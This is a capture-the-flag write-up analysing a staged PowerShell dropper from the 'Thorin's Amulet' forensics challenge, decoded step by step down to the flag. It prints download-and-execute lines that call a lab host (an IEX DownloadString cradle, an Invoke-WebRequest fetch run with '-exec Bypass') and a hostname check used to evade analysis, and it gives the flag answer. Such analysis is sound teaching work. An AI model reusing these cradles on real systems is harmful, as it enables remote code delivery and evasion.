# Thorin's Amulet

> **Note:**  
> The challenge can be downloaded here: [forensics_thorins-amulet.zip](https://0x42697262.github.io/birbrain/writeups/HackTheBox/_attachments/thorins-amulet/forensics_thorins_amulet.zip)

## Overview

### Description

> Garrick and Thorin’s visit to Stonehelm took an unexpected turn when Thorin’s old rival, Bron Ironfist, challenged him to a forging contest.
> In the end, Thorin won the contest with a beautifully engineered clockwork amulet, but the victory was marred by an intrusion.
> Saboteurs stole the amulet and left behind some tracks.
> Because of that, it was possible to retrieve the malicious artifact that was used to start the attack.
> Can you analyze it and reconstruct what happened?  


This forensics challenge involves analyzing a Base64-encoded PowerShell "malware" script.
The script retrieves another script from a web URL protected by basic authentication.
Inside the downloaded script lies the actual malware code—our flag.

## Investigation

I opened `artifact.ps1` and immediately noticed a Base64-encoded string being executed with `powershell.exe -EncodedCommand`.

> **Note:**  
> The source code of the script can be downloaded [here](https://0x42697262.github.io/birbrain/writeups/HackTheBox/_attachments/thorins-amulet/files/artifact.ps1).

As I do not like running scripts without checking them first, I opened the script in a text editor:

### artifact.ps1

```powershell
function qt4PO {
    if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
        exit
    }
    powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
}
qt4PO
```

### Decoding the First Layer

Here's the relevant line:

```powershell
powershell.exe -NoProfile -NonInteractive -EncodedCommand "SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCJodHRwOi8va29ycC5odGIvdXBkYXRlIik="
```

This suggests that the script is trying to execute a command encoded in *Base64*.

Interestingly, the script contains a basic anti-analysis check:

```powershell
if ($env:COMPUTERNAME -ne "WORKSTATION-DM-0043") {
    exit
}
```

If the computer name isn’t `WORKSTATION-DM-0043`, the script terminates.
This is likely an attempt by the author to prevent execution on unintended machines.

Since I was too lazy to open *CyberChef*, I extracted and decoded the Base64 string directly:

```bash
grep -Eo '"[A-Za-z0-9+/=]+"' artifact.ps1 | tr -d '"' | base64 -d
```

#### Explanation:
- `grep -Eo '"[A-Za-z0-9+/=]+"' artifact.ps1`  
  - `-E`: Enables extended regular expressions.
  - `-o`: Outputs only the matched text, excluding surrounding content.
  - `"[A-Za-z0-9+/=]+"`: Matches a quoted Base64 string.
- `tr -d '"'`  
  - Removes double quotes from the matched Base64 string.
- `base64 -d`  
  - Decodes the extracted Base64 string.

#### Better Method Using `awk`

```bash
awk -F'"' '/EncodedCommand/ {print $2}' artifact.ps1 | base64 -d
```

**Why is this better?**
- Instead of searching for arbitrary quoted strings (grep method), it directly finds the `EncodedCommand` line.
- `awk -F'"' '{print $2}'` extracts only the content inside the quotes.
- More precise and avoids unintended matches.

This gave us:

```powershell
IEX (New-Object Net.WebClient).DownloadString("http://korp.htb/update")
```

So, the script is attempting to download another payload from `http://korp.htb/update` using PowerShell’s `DownloadString` method.

## Fetching the Second Script

> **Note:**  
> The source code of `update.ps1` can be downloaded [here](https://0x42697262.github.io/birbrain/writeups/HackTheBox/_attachments/thorins-amulet/files/update.ps1).

### update.ps1

```powershell
function aqFVaq {
    Invoke-WebRequest -Uri "http://korp.htb/a541a" -Headers @{"X-ST4G3R-KEY"="5337d322906ff18afedc1edc191d325d"} -Method GET -OutFile a541a.ps1
    powershell.exe -exec Bypass -File "a541a.ps1"
}
aqFVaq
```

In `update.ps1`, there is a function `aqFVaq`. This function fetches another script from `http://korp.htb/a541a`, but this time it requires authentication via a custom HTTP header (`X-ST4G3R-KEY`).
Without this header, the request would fail.

I used `curl` to manually download the script:

```bash
curl http://korp.htb/a541a --header "X-ST4G3R-KEY:5337d322906ff18afedc1edc191d325d" -o a541a.ps1
```

Now, let’s check out `a541a.ps1`.

## Reconstruction

> **Note:**  
> The source code of `a541a.ps1` can be downloaded [here](https://0x42697262.github.io/birbrain/writeups/HackTheBox/_attachments/thorins-amulet/files/a541a.ps1).

### a541a.ps1

```powershell
$a35 = "4854427b37683052314e5f4834355f346c573459355f3833336e5f344e5f39723334375f314e56336e3730727d"
($a35 -split "(..)" | ?{$_} | % {[char][convert]::ToInt16($_,16)}) -join ""
```

Notice that a hex-encoded string is assigned to the variable `$a35` and the variable gets decoded on the next line.

Since nothing is being executed dynamically here, it should be safe to decode.

### Decoding the Payload

Running it in PowerShell:

```powershell
powershell a541a.ps1
```

Output:

```
HTB{7h0R1N_H45_4lW4Y5_833n_4N_9r347_1NV3n70r}
```

**Hence, flag captured! 🎉**

If you do not trust the code or do not know how to read PowerShell scripts, it is completely okay to copy the encoded flag hex values into CyberChef.


